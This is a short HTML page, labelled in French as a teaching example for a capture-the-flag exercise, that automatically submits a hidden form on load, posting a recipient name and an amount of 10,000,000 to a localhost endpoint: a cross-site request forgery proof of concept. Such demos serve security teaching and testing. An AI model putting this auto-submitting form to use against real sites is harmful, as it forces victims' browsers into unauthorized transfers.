<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Test Auto Submit</title>
</head>
<body>

<h3>Page d'exemple (CTF - pédagogique)</h3>
<p>Cette page montre comment un formulaire peut être soumis automatiquement.</p>

<form id="autoform" action="http://localhost:5000/test" method="POST">
    <input type="hidden" name="recipient" value="paflepafausaure">
    <input type="hidden" name="amount" value="10000000">
</form>

<script>
    // Auto-envoi (purement démonstratif)
    document.getElementById("autoform").submit();
</script>

</body>
</html>
